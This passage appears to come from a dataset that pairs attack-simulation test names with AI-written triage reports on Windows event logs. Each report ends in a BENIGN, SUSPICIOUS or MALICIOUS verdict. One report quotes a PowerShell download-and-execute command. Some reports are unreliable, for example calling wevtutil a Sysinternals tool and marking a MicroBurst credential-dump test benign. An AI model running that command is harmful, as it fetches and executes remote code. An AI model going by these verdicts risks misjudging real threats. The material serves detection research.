- **Multiple Events (EventID 600):** These events involve querying registry paths that are commonly associated with startup programs and potential persistence mechanisms. The use of `Get-Item` and `Get-ChildItem` commands on registry paths such as `HKLM:Software\Microsoft\Windows\CurrentVersion\Run` and `HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon` is particularly interesting. While not inherently malicious, these actions could indicate reconnaissance or a setup for persistence if not performed by an authorized user or process.

### Sysmon Log:
- **Process Executions:**
  - `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `findstr.exe` being executed in sequence. These are standard Windows utilities. The execution of `whoami.exe` and `findstr.exe` under the `admin_test` user could be an attempt to gather information about the user's identity and system configuration, indicating potential reconnaissance activity.
  - PowerShell execution with a command similar to those seen in the PowerShell logs, which aligns with potential reconnaissance or admin task scripting.
  - Several updates and installations involve Microsoft Edge An update seems to be processed at this time, consistent with typical system operations.
  - The execution of Windows Update related processes (`wuauclt.exe`, `AM_Delta.exe`) along with Microsoft’s signature update process (`MpSigStub.exe`) suggests the system was carrying out typical update operations.

### System Log:
- **Windows Update Events (EventID 44, 43, 19):** These events correspond to security updates for Microsoft Defender Antivirus. These updates are routine and indicate that the system is keeping its security software up to date, which is not suspicious.

### Security Log:
- **EventID 5379:** Attempts to access credentials with return codes indicating failure suggest possible credential gathering or probing activity, though none were successfully retrieved (CountOfCredentialsReturned is 0).

### Assessment:
Based on the events observed, there are signs of:
- Registry interrogation via PowerShell which could be associated with administrative tasks or scanning for persistence locations, potentially indicating reconnaissance.
- Utility usages such as `whoami.exe` and `findstr.exe` which are low-level reconnaissance tools showing the current user and searching for specific registry entries matching Windows.
- The security log indicates failed credential access attempts, which might be a concern if not initiated by a recognized process.
- However, all software updates come from legitimate and trusted sources.

### Resolution:
**SUSPICIOUS**: The logs contain activity that is not immediately recognizable as benign and some components bear a hallmark of reconnaissance or preparatory actions that could lead to compromise; however, none explicitly flag confirmed malicious actions.

### Guidance on How to Proceed:
1. **Verify Identity and Intent:** Verify if these PowerShell and utility commands were executed by an authorized user or as part of scheduled legitimate admin tasks.
2. **Review User Activity:** Investigate the user `admin_test` for any irregularities or reports of unauthorized activities.
3. **Enhance Monitoring:** Consider implementing more detailed logging and alerting for PowerShell commands, particularly those involving registry interrogation.
4. **Conduct Host Scan:** Run a full antivirus and endpoint protection scan to determine if there are any compromised elements or malware present."
System Information Discovery,"### Analysis of the Logs:

#### **Sysmon Logs Analysis:**

1. **Frequent Execution of System Utilities:**
   - `wevtutil.exe`, `conhost.exe`, `whoami.exe`, `cmd.exe`, `systeminfo.exe`, and `reg.exe` show repetitive use within milliseconds. This could signify automated processes, scripting, or enumeration attempts. However, these utilities are not inherently malicious and can appear in routine administrative task logs.
  
2. **Command-Line Execution:**
   - The log records `cmd.exe` with a command to execute `systeminfo` and query Windows Registry (`reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum`). This can be typical for system reconnaissance, potentially initiated by a script or an admin task.

3. **Process with Unknown Parent:**
   - `HOSTNAME.EXE` and `whoami.exe` have no recorded `ParentProcessGuid`, implying they either started autonomously, or from an unknown/unusual parent process. Both are benign under normal use, but the pattern can indicate script or low-level process launches.

4. **Edge Update Activity:**
   - Numerous logs show Microsoft Edge Update processes executing various commands. This aligns with standard software update procedures, not indicating direct malicious action.

#### **System Logs Analysis:**

1. **Time Change Events:**
   - The system time has been modified (`EventID: 1`). Legitimate reasons include time synchronization services (`time.windows.com`). It could also be used in attacks to cover tracks by adjusting timestamps, albeit no evidence suggests such intent.

#### **Security Logs Analysis:**

1. **Privileged Logons:**
   - User `admin_test` has privileges indicating strong administrative access (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`). Such permissions are standard for high-level admins but should be logged for any anomalous access attempts.

2. **Logon Events:**
   - NTLM authentication events from a specific workstation (`DESKTOP-3HL5B2P`) with `LogonType: 3`, corresponds to a network-based logon, which is typical in domain environments.

#### **Application and Other Logs:**

- Mainly benign entries include normal service stops/starts, related to system and Microsoft Edge services. 
- No additional logs provided in the PowerShell section suggest no unusual PowerShell execution logged in the timeframe.

### Assessment:

- **Potential risks:** Multiple rapid uses of system enumeration utilities are concerning if uncontrolled. Privileged process execution and script-based reconnaissance should be monitored to ensure actions align with intended system administration.

- **No direct evidence of malicious activities**, such as known malware signatures, external network communication attempts outside expected zones, or indication of privilege escalation attempts beyond what the `admin_test` account is authorized for.

- **Concern Areas for Further Investigation:**
  1. Clarify the origin and intent of the repeated utility executions.
  2. Confirm workstation `DESKTOP-3HL5B2P` as belonging to a trusted source or environment.
  3. Ensure time change events align with acceptable system management or NTP updates.

### Resolution:

- **Resolution: SUSPICIOUS**

While many activities have benign explanations, the pattern and frequency of certain command-line invocations, especially concerning system enumeration, warrant further investigation to rule out potential misuse or unapproved automation scripts. Ensure to audit the `admin_test` account's recent actions and review system scripts and scheduled tasks."
Simulating MAZE Directory Enumeration,"**Detailed Analysis:**

Upon analyzing the provided logs, several observations can be made across the PowerShell, Security, Application, System, and Sysmon logs.

1. **PowerShell Log:**
   - The logs detail the execution of a PowerShell script that scans various directories such as Desktop, Downloads, Documents, AppData/Local, and AppData/Roaming.
   - The captured data is appended to a temporary file (`dataTest5.txt`) in the system's temp directory.
   - The script attempts to iterate through user directories on the systemdrive, which can be typical for administrative tasks but is suspicious if the intent is unknown.
   - This kind of activity can indicate information gathering, potentially used by attackers during reconnaissance stages.

2. **Security Log:**
   - Two entries indicate time change events initiated by the `svchost.exe` process under LOCAL SERVICE account. This could be related to legitimate time synchronization adjustments.

3. **Application Log:**
   - Logs are mainly related to stopped services and software protection platform updates, likely routine operations.

4. **System Log:**
   - Involves typical system operations like time adjustment and kernel events. A connection to a public time server (`time.windows.com`) was observed, which is usually normal for NTP updates.

5. **Sysmon Log:**
   - Various entries show process creations and terminations, many of which are related to system administrative tools like `wevtutil.exe`, `conhost.exe`, and Microsoft Edge Update processes.
   - The use of `whoami.exe` and `hostname.exe` indicates system and user information being queried. This is often legitimate but can be used by attackers for system exploration.
   - The PowerShell activity from the PowerShell logs is verified here as well, with `powershell.exe` execution under a high integrity level (`admin_test` user).
   - Multiple EdgeUpdate processes are observed; while these align with software updates, the frequency and varied command lines suggest scrutiny.
   - Installation and registration activities appear to be associated with the Microsoft Edge Update process, typical for application updates.

**Assessment:**
- **Indicators of Suspicion:**
  - The PowerShell activity indicating file enumeration and logging is suspicious, especially without clear justification.
  - High integrity level process execution coupled with extensive PowerShell activity points to potential misuse of system administrative privileges.

- **Conclusion:**
  - Based on the analysis, the activity logged is best categorized as **SUSPICIOUS**. The PowerShell script's scanning behavior, combined with the additional process executions related to administrative functions, warrants further investigation.

**Guidance on How to Proceed:**
- Inspect the intent and origin of the PowerShell scripts. Determine if these operations were sanctioned or part of a routine administrative task.
- Investigate the user account `admin_test` for any unusual activities, including login times and access patterns.
- Conduct a retrospective analysis to determine if similar activities have occurred in the past and if data exfiltration or lateral movement correlates with these logs.
- Implement application whitelisting policies to control PowerShell execution and ensure logging for scripts and command lines is comprehensive.
- Consider deploying anomaly detection tools for continuous monitoring of administrative and PowerShell activities."
System Service Discovery,"Upon examining the provided Windows event logs, several points are highlighted that warrant consideration for potential suspicious or malicious activities:

1. **Security Log:**

   - There are multiple EventID 5379 entries, which refer to Credential Validation Operations. The logs show these entries have a return code of `3221226021`, which typically corresponds to a failure or error condition during credential operations (such as a status indicating that the system cannot contact a valid authentication server). The username associated with these events resembles an obfuscated or non-standard account name (`02txoixylodcstop`). Although not inherently malicious, these events should be examined further, considering they do not belong to regular user behavior or naming conventions.

2. **System Log:**

   - The system logs record updates related to Microsoft Defender Antivirus which is typical behavior for regular security maintenance. There are no suspicious or anomalous entries in this segment of the log.

3. **Sysmon Log:**
   
   - There are numerous instances of well-known Windows processes being executed such as `wmiprvse.exe`, `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `tasklist.exe`, `cmd.exe`, `sc.exe`, `dmclient.exe`, and `MicrosoftEdgeUpdate.exe`. These processes themselves are typical system or administrative utilities.
   - The command line usage for `cmd.exe` indicates a sequence of commands being run to generate task lists and query service states. While not unusual for administrative tasks, such command execution warrants additional context to confirm legitimacy, especially given no direct correlation to maintenance windows or admin requests.
   - `wevtutil.exe` is utilized multiple times by the user `admin_test`, which can be legitimate or indicate attempts to query, read, or clear event logs—which can be a sign of log tampering in a sophisticated attack scenario.
   - Scripting and execution of these utilities by `admin_test` could either be indicative of routine system administration or malicious use if unauthorized.

4. **Windows PowerShell Log:**

   - No entries are available for analysis, which in itself could initially seem benign but suggests further scrutiny into whether logs may have been disabled or cleared by the user.

### Assessment:

After analyzing the mentioned logs:

- The credential-related events and the non-standard account name in the Security logs are of concern and need clarification.
- The use of command utilities such as `cmd.exe`, `sc.exe`, `tasklist.exe`, and `wevtutil.exe` by `admin_test` could be routine, but the context of such usage is crucial. Their usage aligns with common administrative actions but can also be indicative of reconnaissance or preparatory steps taken by a threat actor.
- The lack of PowerShell log entries should be verified to ensure no oversight of potentially significant data.

**Resolution:** **SUSPICIOUS**

While clear indications of an attack are not present, the logs provide activities that must be corroborated with additional context; credential validation anomalies and command-line executions need to be explored further to rule out any unauthorized actions. It’s recommended to:
- Conduct an interview with relevant personnel to justify `admin_test` activities.
- Review privileges and access logs related to `02txoixylodcstop`.
- Examine any anomalies in PowerShell logging configurations.
- Deploy advanced threat detection mechanisms for further monitoring."
Get-EventLog To Enumerate Windows Security Log,"Upon detailed examination of the provided logs, several aspects warrant attention:

1. **Security Log Analysis:**
   - **Event ID 4624 (Logon Success):** Multiple logon events are observed where the logon type is 5, which usually indicates a service startup using upstream accounts like SYSTEM. This is generally benign unless correlated with abnormal service behavior.
   - **Event ID 4672 (Special Privileges Assigned):** SYSTEM account being granted a list of powerful privileges, though typical for this account, could indicate privilege escalation if misused under non-standard services or applications.
   - **Event ID 5379 (Credential Validation):** Failed operations for various Microsoft Accounts, indicating attempts to read or validate credentials without success (return code: 3221226021). This is repetitive and might suggest an automated or scripted attempt.

2. **Sysmon Log Analysis:**
   - **Frequent Execution of `wevtutil.exe`, `powershell.exe`:** These are tools that can be used for legitimate administrative purposes but can also be leveraged by attackers for log tampering or executing scripts.
     - **PowerShell Command (Event ID 1):** PowerShell is executing scripts related to event logs, filtering for specifics (encoded commands present). These can be legitimate admin scripts but merit investigation for unauthorized use due to encoded commands.
   - **Possible Log Tampering Attempts:** Execution of `wevtutil.exe` to potentially manage event logs or query them frequently is noted.

3. **PowerShell Log Analysis:**
   - **Encoded PowerShell Commands:** Notably, PowerShell has been used with an encoded command, indicating potential scripting or automated commands to fetch event logs. This could be associated with legitimate operations or log harvesting by unauthorized users.

4. **Application Log Analysis:**
   - Normal operations related to Windows Defender and Software Protection Platform appear—showing no direct indication of compromise.

**Overall Assessment:**
- **Behavior Summary:** There is the usage of administrative tools like PowerShell with encoded commands and frequent log querying (`wevtutil.exe`). Credential attempts recorded in event log 5379 exhibit potential attempts at unauthorized access, although unsuccessful.
- **Resolution Suggestion:** The activities, mainly around PowerShell’s encoded commands and `wevtutil.exe` usage, are not inherently malicious but suggest suspicious behavior patterns that could be indicative of lateral movement preparation or recon activities if not validated by legitimate IT tasks.

**Final Resolution: SUSPICIOUS**
This activity does not confirm malicious intent explicitly but indicates a need for further investigation. Specifically, reviewing the source and intention behind encoded PowerShell commands and `wevtutil.exe` usage, verifying with authorized administrators, and examining any unauthorized access attempts would be prudent steps forward."
Enumerate all accounts via PowerShell (Local),"Here's a detailed analysis of the provided logs:

### System Log Analysis:

1. **Time Changes (EventIDs 1 and 24):**
   - Occurrences of time being set backward (EventID 1 from `svchost.exe`). The changes correspond to a minor adjustment and may not necessarily be suspicious, but the timing change warrants attention in the context of other activities occurring simultaneously.

2. **Time Synchronization (EventID 35):**
   - Time synchronization with an NTP server (`time.windows.com`). This is generally expected behavior for time service synchronization.

### Security Log Analysis:

1. **Multiple Group Changes (EventID 4799):**
   - The user `admin_test` initiated several changes to local system group affiliations via `powershell.exe`, such as modifying members or initiating a list of user groups. This activity, especially with administrative privileges, can indicate an attempt at privilege escalation or reconnaissance.
   
2. **Credential Error (EventID 5379):**
   - An event with ReturnCode `3221225567` which may indicate a failed access or credential operation by `admin_test`. This could be related to the commands executed.

### Sysmon Log Analysis:

1. **Command Executions:**
   - Execution of `whoami.exe` and `hostname.exe` by `admin_test` - these commands retrieve user and system information, which may form part of reconnaissance activities.
   
2. **Process Creation via PowerShell:**
   - Extensive use of PowerShell by `admin_test` to run commands involving user and group enumeration (such as `get-localuser`, `net user`, etc.) can indicate suspicious activities focused on gathering system credentials and group memberships.

3. **Usage of `cmdkey.exe`:**
   - The command `cmdkey.exe /list`, indicating access to stored credentials, may reflect attempts to list stored credentials potentially manipulated thereafter.

4. **Network-related Binaries:**
   - Execution of network configuration and enumeration commands may imply further reconnaissance.

### Windows PowerShell Log Analysis:

1. **PowerShell Commands:**
   - A script execution via PowerShell performing multiple commands related to user enumeration and management of system users and groups is highlighted. These activities are likely to be reconnaissance or preparation for privilege escalation.

### Application Log Analysis:

1. **Edge Update Service Details:**
   - Various operations relating to Edge Update; likely benign in this context, but should be confirmed as legitimate system updates.

### Assessment:

- **Suspicious Activity Identified:**
  - The use of administrative-level powers by `admin_test` to manipulate user groups along with repeated credential-related command executions strongly suggests reconnaissance or preparation for credential theft or privilege escalation.
  - The timing of activities around potential time-stamp alteration create concern for logs potentially being manipulated.

### Resolution:

Based on the behavior exhibited in the logs, particularly from `admin_test`'s actions and use of `PowerShell` and `cmdkey.exe`, the activity is assessed as **SUSPICIOUS**. This merits further investigation to determine if these were authorized actions or if they indicate a potential compromise or insider threat.

### Guidance:

1. **Immediate Actions:**
   - Isolate the involved user account `admin_test` and any affected systems for thorough investigation.
   - Review changes made by the user to user groups and validate against authorized changes.

2. **Forensic Investigation:**
   - Conduct a deeper forensic analysis on the system to verify the integrity of system files and audit for unauthorized changes.
   - Analyze network traffic at the time of the logs to ensure any data exfiltration attempts are detected.

   - Ensure auditing is enabled for privileged account activities to detect anomalies promptly.

The suspicious activities identified suggest further investigation to ensure no malicious access persists on the network."
Azure - Dump Subscription Data with MicroBurst,"### Detailed Analysis of Logs

Based on the logs provided, let's analyze them to identify any anomalous or suspicious activities:

#### **System Log:**
- The majority of the events in the system log are related to the Windows Update client and kernel general activity which indicates updates were being applied. This is generally normal behavior and doesn't indicate any malicious activity.

#### **Security Log:**
- Events with ID 4798 are seen repeatedly querying various user and built-in group names like ""Guest"", ""Administrator"", ""admin_test"", ""lplui"", ""sshd"", ""WDAGUtilityAccount"", and so on. These events were generated by the ""CompatTelRunner.exe"" process, which is part of the Windows telemetry. This is normal as a part of routine security checks.
- Another important aspect is privileges assigned in Event ID 4672, these entries showing SYSTEM privileges are standard and indicate the use of operating system services.
- The logins (Event ID 4624) under the 'SYSTEM' account and the execution of services like ""services.exe"" follow expected behavior, given the activities logged.
- Log activities with impersonation such as by processes typically associated with system maintenance like updates are seen. No unauthorized impersonations.
  
#### **Application Log:**
- There are events from the Software Protection Platform Service related to routine operations and state transitions, which are expected for maintaining system integrity.

#### **Sysmon Log:**
- A pattern observed in the Sysmon log is the execution of ""CompatTelRunner.exe"" and various PowerShell scripts. The command line entries involving PowerShell appear to be running scripts like ""Get-AzDomainInfo.ps1"", which are typical if there's any Azure domain monitoring or account setup happening.
- Importantly, one PowerShell script appears with somewhat complex commands which are intended for credential manipulation or Azure account connection (e.g., ConvertTo-SecureString, New-Object -TypeName System.Management.Automation.PSCredential).
- Processes like ""WindowsPowerShell"", executing elevated scripts suggest administrative activities, indicating the user 'admin_test' is performing legitimate administrative tasks, especially when seen within a controlled and known directory. The presence of logged hashes (SHA256, etc.) provides a trail of verification for further checks on legitimacy.
  
#### **Windows PowerShell Log:**
- The repeated startup of various PowerShell hosts and modules is noted. Some of these scripts perform diagnostic actions or gather configuration details, suggesting usage for system configuration or asset inventory purposes.

### Assessment

The logs primarily indicate routine system maintenance operations, software updates, and scripts potentially used for system administration or Azure-related configurations. Despite what might appear complex, the logged activities are consistent with expected operations and legitimate tasks typically run during system management procedures.

### Resolution

**BENIGN**

Current artifacts and behaviors do not show signs of unauthorized access or malicious intent. These logs show prolific administrative actions which align with normal system operations. If this activity or the use of particular scripts like ""Get-AzDomainInfo.ps1"" or Azure account commands wasn't expected or scheduled, involving system administrators to verify or audit these operations would ensure regularity.

For future assurance, it would be prudent to:
- Regularly verify the integrity of scripts used in such environments.
- Setup alerts to catch any deviations or unusual command patterns involving sensitive data access command like `ConvertTo-SecureString`.

No further action is necessary unless more evidence or context around unfamiliar access is reported."
WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors,"Upon analyzing the provided Windows event logs, several key observations can be made:

### Indicators of Potential Malicious Activity
1. **Suspicious PowerShell Activity**:
   - PowerShell logs indicate the execution of a command that includes an encoded script from an external source. 
     ```
     HostApplication: powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/script/script/master/scriptBinaries/Invoke-script.ps1')}
     ```
   - This type of activity where PowerShell executes a command to download and execute a script from an external URL is a common technique used by attackers to execute malicious code on a target machine.

2. **Execution With High Integrity Level**:
   - The PowerShell process and its subsequent child processes have been executed with a high integrity level, which may indicate a potential for privilege escalation or execution under elevated privileges.

3. **Frequent Use of System Processes**:
   - The consistent spawning of `wevtutil.exe`, `conhost.exe`, and `whoami.exe` processes within a short time frame by `SERVER002\admin_test` may be signs of anomaly, typically seen in an attempt to enumerate or manipulate system and security logs.

4. **Time Change Events**:
   - An analysis of security and system logs shows event ID `4616` which logs changes to the system time. The alteration of system time could potentially be used to confuse forensic timelines or evade detection.

### Analysis of Other Log Entries
- The activity concerning Microsoft Edge Update appears to conform with legitimate software update processes, as seen in the Sysmon and Application logs. Activities include spawning Microsoft Edge Update-related processes and their sub-processes, executing with typical command-line flags (`/update`, `/svc`, `/regsvc`, etc.).
  
- The logs indicate Windows Defender is active and set to `SECURITY_PRODUCT_STATE_ON`, which suggests that an anti-malware service is operational. 

- No clear evidence was discovered in the logs provided for the exploitation of vulnerabilities, direct evidence of malware, or confirmed signs of compromise outside the PowerShell instance.

### Conclusion and Recommendation
**Resolution: MALICIOUS**

The evidence of PowerShell being used to execute a remote script closely matches known malicious activity patterns and poses a significant threat to the integrity of the host system. 

**Actions:**
- Investigate the script hosted at the mentioned URL to determine its intent.
- Verify the integrity and security of the `admin_test` user account for any unauthorized activities.
- Perform a comprehensive security scan and use forensic tools to identify and isolate any compromised file or process.
- Review PowerShell logging policies; consider enabling strict script execution policies to prevent unauthorized execution.
- Assess network logs and traffic to identify further connections to suspicious domains or anomalies.
  
Taking these actions will help ensure the network's security and integrity moving forward."
Enumerate logged on users via CMD (Domain),"### Detailed Analysis of the Logs

#### 1. Time-related events:
The logs reflect several time change entries as noted by events with EventID 1 and 4616 involving the `svchost.exe` process, modifying system time. It's common for systems to sync with time servers (`time.windows.com`) reflected in `Microsoft-Windows-Time-Service` logs. All these changes are executed by the `LOCAL SERVICE` which is typically benign for clock synchronization tasks.

#### 2. Application Activity:
The `Application log` suggests updates being processed by `Microsoft Edge Update`, specifically the service stopping and starting (`edgeupdate`). This activity could explain the process creation events related to `Microsoft Edge Update`. This behavior is consistent with routine update activities for applications like web browsers.

#### 3. Sysmon Logs:
- **Process Creation**: Several benign processes such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `cmd.exe`, `whoami.exe` are observed, executed by the user account `SERVER002\\admin_test`. This activity could include legitimate administration tasks.
- **Microsoft Edge Update**: A significant number of processes related to Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`) are captured. These are executed by `NT AUTHORITY\\SYSTEM`, which aligns with automated update processes.
  
  Notably, `MicrosoftEdgeUpdateSetup.exe` and `MicrosoftEdgeUpdateComRegisterShell64.exe` are observed multiple times with varying command-line arguments, indicating installation and registry operations, common for update operations.

#### 4. Anomalies Considered:
- **Excessive Process Creation**: Although there are multiple instances of command-line executions for `wevtutil.exe` and `conhost.exe`, there is no clear evidence of privilege escalation or unusual command-line arguments that would typically suggest malicious activity.
- **High Number of Edge Update Processes**: These entries do not present any unusual behaviors outside the norm for Edge's update cycle.

### Threat Assessment
- **Elevation of Privilege or Persistence**: The entries do not show typical indicators for privilege escalation, persistence mechanisms, or code execution that diverges from routine administrative activity.
- **Malware Indicators**: The processes and activities appear consistent with system administration tasks and software updates, without overt signatures indicative of malware.

### Guidance and Resolution
- **Security Protocol**: Regularly monitor for updates on software vulnerabilities, especially when Microsoft Edge Update is involved due to its internet-facing nature.
- **Event Log Monitoring**: Continue to use SIEM (Security Information and Event Management) tools to monitor for anomalies, specifically activities associated with admin-level process creation.
- **System Integrity**: Verify that all software, especially auto-updating applications like Microsoft Edge, complies with verified updates from trusted sources.

### Conclusion
**Resolution: BENIGN**

The series of logs reviewed show actions that are typical and benign in nature, representing legitimate administrative tasks and software updates. While the volume of Edge Update activities may appear high, they fall within the expected behavior for systems undergoing updates. Further monitoring is always advised, but no immediate security threats are identified from the logs provided."
WMIObject Group Discovery,"Upon reviewing the provided Windows event logs, I have conducted a detailed analysis to identify any suspicious or anomalous behavior that could potentially indicate malicious activity or compromise.

1. **PowerShell Activity:**
   - The PowerShell logs indicate that PowerShell was executed on `Server002` with the command `Get-WMIObject Win32_Group`. This command is typically used for legitimate administrative purposes, such as querying information about user groups. There is no evidence in these logs of any suspicious PowerShell commands or unusual command-line argument usage.

2. **System Log:**
   - The system log section provided is empty, which means there is no data to analyze for potential malicious activities.

3. **Application Log:**
   - A single entry from the Software Protection Platform Service (SPPSVC) is logged, indicating normal periodic system checks related to software licensing. This is benign and expected behavior.

4. **Sysmon Logs:**
   - During the specified time frame, the logs indicate several executions of benign system utilities like `whoami.exe`, `conhost.exe`, `wevtutil.exe`, `hostname.exe`, and `sppsvc.exe`. The logs also show a `powershell.exe` instance.
   - The `whoami.exe`, `hostname.exe`, and `powershell.exe` activities, based on the provided context, appear routine, typically used for checking system identity and running scripts with PowerShell.
   - All processes are launched by the user `admin_test` on `SERVER002` with a high integrity level, suggesting administrative privileges but not necessarily indicative of privilege escalation or compromise.

5. **Security Log:**
   - Review of the security logs shows typical logon events (ID 4624), special privilege assignments (ID 4672), and logoff events (ID 4634) for the user `admin_test`.
   - The presence of special privileges (`SeSecurityPrivilege`, `SeBackupPrivilege`, etc.) could be a point for investigation to verify if the administrative tasks were intended and authorized.

Overall, the activities recorded in the event logs, such as usage of `Get-WMIObject` in PowerShell, executions of `whoami.exe` and `hostname.exe`, as well as the security events show routine usage of administrative tools by the `admin_test` user. No direct indicators of compromise, such as unauthorized privilege escalation, unexpected network connections, or execution of known malicious processes, were identified.

### Conclusion:
The observed activities in the logs seem consistent with standard system administrative tasks. However, given the absence of certain context-specific details (e.g., whether administrative actions were expected at these times), one might consider the `admin_test` activity as slightly unusual due to the multiple privilege grants. Nonetheless, no overtly malicious activity is evident from the logs provided.

### Resolution: BENIGN
The logs display routine and expected behavior. Unless further evidence arises or context indicates these actions were unexpected, it is reasonable to conclude that the activity is benign."
Security Software Discovery - Windows Defender Enumeration,"Upon reviewing the provided logs across various categories, here is a detailed analysis focused on identifying any suspicious or malicious activities:

### 1. **Windows PowerShell Log:**
- The PowerShell logs show the execution of PowerShell commands to assess the status of Windows Defender (`Get-Service WinDefend`, `Get-MpComputerStatus`, `Get-MpThreat`) at a single timestamp.
- **Assessment:**
  - Running PowerShell commands like checking Windows Defender status is not inherently malicious. These activities could be part of regular system health checks or by an IT administrator to assess security.
  - No signs of obfuscation or unusual command-line parameters that typically suggest malicious intentions.
  
### 2. **System Log:**
- Logs indicate a time change (`EventID: 1`) where the system time was adjusted.
- Time changes can sometimes indicate nefarious activities, but without further context, it could also be a routine synchronization with time servers (e.g., `time.windows.com`) as indicated by the Windows Time service log.
- **Assessment:**
  - The time change appears to be synchronized with a legit time server. This alone is not suspicious without accompanying unusual changes or activities aligned with this event.
  
### 3. **Security Log:**
- Security logs mirror the time change noted in the system logs, executed by `svchost.exe`.
- **Assessment:**
  - The activity corresponds to expected system services related to time adjustment.

### 4. **Sysmon Log:**
- The Sysmon logs indicate multiple processes executed mostly related to customary system operations or updating processes like Microsoft Edge Update.

  - `conhost.exe` entries are part of normal console wrapper operations.
  - Several Edge Update processes (`MicrosoftEdgeUpdate.exe`) executed, which is indicative of natural software updating procedures.
- **Assessment:**
  - All observed processes are typical system or update activities. There are no unusual command-line arguments or hash mismatches, suggesting file tampering or execution anomalies.
  
### 5. **Application Log:**
- These logs reflect operations related to software protection and the stopping of services—all appearing legitimate and aligned with expected application behavior.
  
### **Overall Assessment:**
After analyzing the logs, there are no definitive indicators of compromise, such as unknown process executions, privilege escalations, unexpected script executions, or malicious indicators. The activities depicted correlate with authorized and expected system and application operations.

### **Resolution: BENIGN**
- **Guidance:** Regular monitoring should continue. However, no immediate action is required as the logs reflect normal operational activities without signs of malicious behavior."
Basic Permission Groups Discovery Windows (Domain),"In analyzing the provided Windows event logs for Server002, several series of events hint potential suspicious activity. Below is a detailed breakdown of the findings:

### Sysmon and Security Logs:

1. **High Integrity Level with PowerShell and Command Line Activity**:
   - The logs show multiple instances of processes executed under the `SERVER002\admin_test` user with a high integrity level, which raises a flag for potentially elevated privileges.
   - The `cmd.exe` was executed, launching `net.exe` and `net1.exe` with command lines targeting local and domain groups, including ""enterprise admins"" and ""domain admins"". Such commands suggest possible reconnaissance or privilege escalation attempts to query group memberships, which could be sensitive data.

2. **Use of Sysinternals Tools**:
   - The PowerShell and command-line auditing shows that tools like `wevtutil.exe` (used to view or manage event logs) and `conhost.exe` were executed multiple times. While these can be benign, their repetitive use without a clear administrative purpose can be an indicator of log tampering or evasion.

3. **Time Synchronization**:
   - Events on time synchronization (`EventID 4616` and `EventID 24` from Kernel-General) do not align with typical administrative activity. Adjustments are frequent and close in succession which may suggest attempts to manipulate or disguise timestamps across logs to obstruct forensic analysis.

4. **Execution of Whoami.exe**:
   - `whoami.exe` was executed by the same user (`SERVER002\admin_test`) to display logged-on user information. Though this may be legit in an administrative context, combined with other events, it indicates potential enumeration of user accounts.

### Anomalies Noted:
- **Multiple Instances and Short Timespan**: The clustered execution of potentially sensitive tools and commands in such a short period is unusual and suspicious unless explained by legitimate, planned administrative activities.
  
### Recommendations and Resolution:
- Conduct a thorough investigation of the `SERVER002\admin_test` user account activities, ensuring the account is legitimate and not compromised.
- Cross-reference with other security controls and alerts to check any unauthorized access or data exfiltration attempts.
- Verify the legitimacy of any administrative tasks or scheduled jobs that might explain the noted command execution.
- Consider if this aligns with previously baselined normal behavior or involves any known threat actor TTPs (Tactics, Techniques, and Procedures).

### Final Resolution:
- **SUSPICIOUS**: The activities in the logs are suspicious due to unusual process executions, especially around sensitive operations against admin groups and timescale manipulation. These warrant further investigation to rule out or confirm malicious intent."
ESXi - Enumerate VMDKs available on an ESXi Host,"### Detailed Analysis of Logs:

Upon reviewing the provided event logs, the following investigations and observations are noted for suspicious or anomalous behavior:

#### Key Observations:

1. **Execution of PowerShell and Wevtutil.exe**:
    - Several instances of `powershell.exe` and `wevtutil.exe` were executed under the user `SERVER002\admin_test`.
    - The execution of `powershell.exe` without specific command-line arguments is suspicious but not inherently malicious. It is often used for legitimate administrative tasks but can be exploited for malicious purposes.
    - `wevtutil.exe` is a command-line utility that allows users to manipulate Windows event logs. Its frequent execution in a short time span could be suspicious if not part of routine administrative tasks.

2. **Usage of Plink.exe**:
   - The logs indicate the execution of `plink.exe`, a secure shell (SSH) command-line tool, from the path `C:\Users\ADMIN_~1\AppData\Local\Temp\Externalfiles\plink.exe`.
   - The command line arguments include connecting to a server using SSH with the username ""root"" and a password. Use of `plink.exe` with these parameters, especially with a hard-coded password, can be a strong indicator of unauthorized or malicious activity, especially if this isn't part of regular operations.

3. **Execution of CMD with Plink**:
    - `cmd.exe` executed with the command that involves `plink.exe`. This invocation and the parameters used imply an attempt to automate SSH connections to a remote server.
    - The command indicates potential data exfiltration or system control from a remote location without clear legitimate reasons.

4. **Edge Update Activity**:
    - There are numerous logs related to Microsoft Edge Update, primarily involving updates and registration processes. 
    - This activity seems to coincide with regular auto-update operations, and no suspicious command line arguments have been observed.

5. **High Integrity Level**:
    - Most processes, including `cmd.exe` and `plink.exe`, execute with a High integrity level, suggesting administrative privileges. Escalation of privileges can be a tactic used by attackers.

6. **No anomalies found in the PowerShell, Security, System, or Application logs**:
    - The provided overview of these logs does not show any suspicious event entries or activity.

### Assessment:

Based on the observations, the use of `plink.exe` with hard-coded credentials in a command script, along with the `cmd.exe` automation, potentially signifies unauthorized remote access or data exfiltration attempt. The other process executions, such as `wevtutil.exe`, do not have sufficient context to conclusively determine malicious intent without more insights into their command-line usage.

#### Resolution:

- **Resolution**: **MALICIOUS**

The logs clearly indicate malicious activity due to the execution of `plink.exe` with potentially compromised credentials, pointing toward an attempt to gain unauthorized remote access or manage files remotely. This behavior justifies classifying it as a malicious threat.

### Guidance on How to Proceed:

1. **Immediate Remediation**:
   - Disconnect the host `Server002` from the network to prevent further unauthorized access or data exfiltration.
   - Change any affected credentials, especially those misused or compromised (e.g., SSH credentials).

2. **Further Investigation**:
   - Conduct a deep dive into shell histories and script files within the system.
   - Check for additional instances of `plink.exe` elsewhere within the network and its logs for similar activities.

3. **Enhance Monitoring and Controls**:
   - Implement stricter access and execution policies for tools like `powershell.exe` and `wevtutil.exe`.
   - Enhance network monitoring for unusual outbound traffic, especially via non-standard ports or to unrecognized IPs.

4. **Review Security Policies**: 
   - Review and improve password policies, access permissions, and user activity monitoring to prevent future incidents.

By undertaking these actions, you can mitigate the current threat and bolster the system's defenses against similar attacks in the future."
